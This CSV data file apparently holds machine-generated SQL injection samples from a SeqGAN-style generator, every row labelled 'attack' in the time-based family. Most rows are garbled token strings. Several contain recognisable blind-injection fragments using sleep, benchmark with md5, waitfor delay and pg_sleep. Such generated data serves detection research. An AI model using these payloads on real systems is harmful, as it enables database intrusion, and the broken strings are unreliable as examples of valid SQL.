label,payload,family,payload_type,method,run_id,sample_index
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'h  )    )    )     )    orliawyd'  =  '' like 'vwq    )  )   )   )  )  )    ypoehrlt  )  sleep  '%'  ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21
attack,"1"" or  5000000  )  5  )  8507  1915  select   (  5  '%'  select  5  )  and  5   )  sr  )  )  =  1210dh or  =  select  )  sleep  5     * or 4240  (  =  =  (  9649  =  =  =  =  benchmark  sleep  select  from from   )  (  (  '%'  =  (  =  6272  0x544d5a4c   (  (  (  8485  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22
attack,"1""  or,  =  =  =  =  5   )  sleep    )  slikelt  =  2841 J  =  selectldd5  )  m5     *     (  =  =  =  0x544d5a4c  =  =  3114  5  )  )    (  =  =  =  =  7021f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23
attack,"   (  select '0:0:5')    )  '%'  =  ""%""  =  =  =  select sleep  =  5000000,1568  0x76555642   )    )  (  (p'sa'  =  5  ""zz  0x544d5a4c  )    )sleep   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24
attack,  )  (  =  benchmark  (  =  (  =  (  =  0x544d5a4c   and  =  8485  (  =  =  (  =  =  y or pg_sleep  =  =  sleep  benchmark  =  0x544d5a4c   )  (  (  sleep  =  5    )     (  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25
attack,1'  )   waitfor delay '0:0:7r  5  s   )   )   and  or sleep  (  1132    sleep  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26
attack,"11%  (    8252  ""  (  =  1210  sleep  7196  select  (  0x544d5a4c  )  # 6793 or r  (  =  =  4683  5  )  )    8594 ese where fromf  #   or 9008  )  9008  5   (  =  =  'fvzcdw",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27
attack,select   =  =  =  5   ands%ew)  vvcsh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28
attack,1'+  (  select 'omike  (  5    )  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29
attack,  sleep  sleep    =  5   <> sleep  =  =  1568  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30
attack,"1""  )   and   (  =  select  =  =  (  =  5  =  =,)    )     )  select 2044  5  6967  2239u    (  'hrta'  =  --y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31
attack,"1"" and or  (  =  =  5   )    )  )   (cO#y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32
attack,"1h' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ''  =  '   piky",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33
attack,4240    or  (  select  =  =  sleep  --f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,34
attack,"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '  =  )  )    )   )   )    )  )   and  3114%h  0x544d5a4crmq  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,35
attack,"  5000000,#  (  )  )  (  0x4c4d6142  sleep    or  6272  5   )  (  (  (  5  )  =    (  's    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,36
attack,5  q  5  sleep     select * 9649  0x544d5a4c  5  )    awa,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,37
attack,"1""   )    )   se#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,38
attack,"1%""  5  )   )      where from 8507 8594  =  (  =  =  ,""  =  =  (  =  =  =  =  0x4c4d6142  7305",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,39
attack,1'  )    )    )    )    )  )    and)    r or and  =  (  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,40
attack,"1'  )   waitfor delay '0:' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ':""lhw/y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,41
attack,1  )  )   )    )     )   )    )     )  s or or  (  =  5874  3672 sleep  5   )  )  q  =  =  =  =  #  =  1210  6272  =  )  =  =  =  =  =  benchmark  1915  5  )  #l,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,42
attack,"5 6793  benchmark  6383  sleep  (  (  5  mdo  )   #viselect or 1679  (  =  ""  =  =  =  =  =  =  ""%""  5    (  (  (  6272=select  =  =  select  sleep  '  (  3672 (  =  select  =  (  0x76555642  =  sleep  =  =  (  =  =  5000000,md5  =  sleep  (yd5  5000000,sleep  (  0x544d5a4c,sleep  (  5  )  =  =  benchmark  ""wucy"" where 8667  =  (  =  =  =  5    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,43
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%y'  =  'hcyftyy    lis  )  (  =  =    )  select  #=      sleep  (  (  'vruavt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,44
attack,"1"" where 2044  0x694a4745   )    5  =  =  =  select  =  =  2044  8252 benchmark  select  and 6969  5000000,sleep  =  #  =  5    (  5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,45
attack,"1liqke  5  6272,benchmark  5et  select  9008  =       =  5000000,  =  6175  =  =  (  =  =  =  =  (  7305  (  5000000,  1568  (  (  5    )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,46
attack,1%' and   (  '  1210  5  )  )  and   'rnzp',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,47
attack,"1""  )  5000000,'  =  5  )    and  5     )   )    )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,48
attack,1'||  (  select '0:    (  0x76555642  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,49
attack,"1""   )    )   and where 'yfvu',or=  =  (  5000000,sleep  =  7305  5   )  (  benchmark  )  --p",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,50
attack,1'  st  )    )    )    sleep  )  sr sleep  select or  (  (6(  1210  =  0x6d457153   and or like andmd5  (  5   )    )  )    )    )      (  (  =  =  6866  =    )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,51
attack,select(  (  select 6793l  =  =  =  (  select  =  (    6383  5   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,52
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '""ravzy'  =  'li'  =  'r)  )  )     l3114)   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,53
attack,1oxn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,54
attack,15'  =  'obmyy  =  6272from   )    )  )   )    )     )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,55
attack,select )  sleep  ' md5  select  (  5    )    (  select  =  5000000'0:0:5'#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,56
attack,"1%%  )   )   )  )  )  yaz   (  ""%""  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,57
attack,"1%""  )   and * 1679  =  =  (  select  (  5000000,sleep  =  =  =  (  =  8667  =  =  5    )  smdd5  )     )  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,58
attack,"1""  r  (  benchmark  =  =  =  =  =   (  4683 '0:0:5')  sleep  5000000,md5",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,59
attack,1  )    )  (  5  )   where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,60
attack,"1%""  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,61
attack,  5   )  (yq yyyq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,62
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""   )    )(  =  '   fawpq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,63
attack,ddiked  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,64
attack,"1  =  )   or * pg_sleep  (  )  =  =  =  5  '%'  3114,md5  (  select  (  5  select  (  =  sleep  8252  7305   (  0x76555642   ""uvzc""  =  )  lrmyyq'  =  'ar",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,65
attack,"1"" and benchmark  =  select sleep  5    )  )  and)    )  select  (  0x76555642)  (1   benchmark  =  (  =  =  sleep  =  5000000,=  =  =        )  (  =  7196  #  (  4683  5  )       =  =  (  #lo",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,66
attack,"1"",0x544d5a4c    sleep  )   )   #az",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,67
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  ''   )    )     )   and sleep  (  5  )   and    (    (     (  'stfr  )  =  =  'rmz)  o  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,68
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""jd5  =    )   )    )   where or  =  =  =  select  )  0x544d5a4c   (     (  0x544d5a4c  =  =  ""%""  0x76555642,md5  (  =  =  1132 where or 3824  =0x544d5a4c   (     )  8667  =  =  =  #  benchmark  sleep  sd  =  select  3824  5  )    )    )     0x76555642 e  0x6d457153   srt  (   (  sleep  sleep  (  5  )    )  select)  (  1210  (  =  =  =  5   and  =  =  =  =  =  =  select",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,69
attack,"1 or like  (  5000000,m0  e  0x76555642s e)    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,70
attack,"1""  )  (  5000000,=  0x6d457153   (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,71
attack,"1%%""   )    )    rlike sleep  (  5  )   and    (    (   ""' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ''  =  ''  =  'thfq  5   y)   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,72
attack,"1'  )   waitfor delay '0:' and   (  'kwhere1132  =  2239 from   (  select  3114  (  =  ' or from   (  (  7305   (  =  (e=  =  =  5  '%'  #l<>,2841  =  (  5  )    )  #  (  8507 where",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,73
attack,"1"" or by",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,74
attack,"1%f    where 2388 from   3114  (  =  =  (  =  =  =  =  (5  =  =  5000000,sleep  =  7305  5  sleep  5  )    )  sddo  =  6866t  )  )  )   and    #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,75
attack,"1  select  (  7279 and sleep  =  =  =  5000000,sleep  4683 rmd5  (  =  =  (  5   )    )    (u)  (    #  sleep  =  =  =  )    )  )  edelay or  =  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,76
attack,"1'  )   )    )    )    )   and)  )  )  )  =  select ,select  0x76555642    )  (  =  =  5  )    )    )  or  (  5    )  )    )    )    )    )    )    s' and   (  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,77
attack,  (  =  6175   )select benchmark  sleep  select  =  (  6175  (  =  #  1210  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,78
attack,"1 sleep  )  s,md5 t  (  =  )  =  0x544d5a4c    )  =  =  =  =  '%'  select,)    (  select sleep  =  =  =  5  #s",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,79
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'j<>e 7196  5   (  7305  select  sleep  select  (  (  (  (  =  =  5   (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,80
attack,select 3672     )   )  )    )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,81
attack,1'  )    )   )   and    (  select * pg_sleep  (  0x6d457153* d5  (  5   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,82
attack,1 and sleep  (  =  sleep  benchmark  select  (  =  <>  =  sleep  select  6967  5  =  =  =  =     )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,83
attack,"1',ff",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,84
attack,"1%""   or sleep  =  (  =  =  =  =  =  =  =  5    (   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,85
attack,1'was,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,86
attack,"1 and,sleep  5   )      or  )  (  sleep  0x544d5a4c   )    )  v",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,87
attack,1%'  =  '   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,88
attack,"1%%'   )    )     )   and sleep  (  5  )   and    (    (     (  ''  =  'z0n:0:5000000sleep  ' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '  2841  select or delay or ""  5  )   )select  5000000,1210  sleep  (  =  =  =  5    )  6272=  =  (  =  select or  (d  =  sleep  (  (  (  (  =  =  )  (  5  )  select  5rg  )  (  select  =  (  =  #  (  benchmark  6272,sleep  5000000,=  =  1132 ,sleep  =  )  (  6272=  =  (  =  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,89
attack,"1%%'wyvx'zot  and)  select pg_sleep  5000000,'0:0:5'    (  )  )    )  )  vzcfviyq  ""wucy"" 8594  (  =  =  0x544d5a4c,2044  =  5000000,sleep  4683  5   )    as  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,90
attack,1'    select  )  (  (  =  benchmark  1915  =  =  5  )  8667  )  )  # eldmk+  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,91
attack,1 8466  0x544d5a4c  vt  5  select  (  1679  =  =  5   )    )  vw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,92
attack,"1""  )    )   )    )    )    )    )) or  0x4c4d6142   )   )    astyue (  benchmark  =  =  =  9649  )  sd5    (  sleep  5000000,md5  5000000,mdm  sleep  (  0x76555642   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,93
attack,"1'  )  )   and where 2044  #  =  (  =  =  =  0x6d457153  sleep  5  )    )  and,2044)    aaw'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,94
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '  vy'  =  'w' like 'g'  =  '""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,95
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%S[ )  =  8485  5000000,sleep  ""uvzc"" or from   (  (  select  (  (  '  (   and or   (  (  5000000,)  benchmark  =  =  0x544d5a4c  (  (  (  s  =  =  =    0x544d5a4c     where * benchmark  sleep  (  0x544d5a4c  (  0x76555642  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,96
attack,"::"" or 6793  =(  =  =  5   )    (    (     )    'wyvx'  =  sleep  select  5   )  (  6272,# where waitfor from   (  0x6d457153  select or  (  =  =  sleep  5  )    )   #y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,97
attack,1  '   )    )     )   and sleep  (  5  )   and    (    (     (  ' or 2044  5   )    )   )    )  )    ))    )  # ' and   (  '  1915o  =  0x544d5a4c  )     ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,98
attack,"1'  )   waitfor delay '0:select""  (  5,melt  5    )    )    )     )   )   )   )   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,99
attack,"1""    (  (  (  =  =  =  =  =  =  6272  =  (  =  select  #  )     )  1915yq      )   and   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,100
attack,1'  )   waitfor delay '05  0x76555642   (--,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,101
attack,1'  )   waitfor delay 'p  =   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,102
attack,waitfor benchmark  =  5  )   )  )  )    )  select  )  sleep  benchmark  sleep  5    )  (  select  (  (  9008  0x544d5a4c  =  (  =  =  3672 or  sleep  1210  =  5  )  )  )  )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,103
attack,1'#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,104
attack,"1'  )  )   )   and  (  ""uvzc"" wyqh",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,105
attack,1'  )   )   )  =  )    --)  )r)  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,106
attack,"1h""s fjwq'  =  '  seslik#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,107
attack,"1"" pg_sleep  (  =  =  5  s  )   (    =  (  =  e   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,108
attack,1'  )  )    )   (h)  )   )   )  #))   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,109
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '  )   or sleep  s  =  )  #  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,110
attack,"1"" or )    md5  =  =  '  select ,8252  #  (  1915  ""%""  =   6793  5000000,sleep  (  =  =  (    6272  5  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,111
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'mkykes elt       )  )    (  1210  5    )   )  #  )    where  =  =  5   y  5g)  (  )  #    )   --yqyqzqu)  )    )    )    )    )    )  )  select ( * or  from   (  =  =  5  )  =  0x544d5a4c  )   )  )  )  '%'  select  (  '%'  (  9649      (  0x544d5a4c  (  =  (  5   #  5   )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,112
attack,"1""   (  5    )  )   )  6866  5  =   f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,113
attack,"1"" or from,sleep  (  (  (  benchmark  -- and)  (  =  sleep  select  =  =  5  )    )  or sleep  (  (  7305  )   )  #  yyqdd5  )    )  v",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,114
attack,1'  0x76555642   (  select  ()  benchmark  (  (  (  0x4c4d6142  sleep  (  (  =  =  =  5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,115
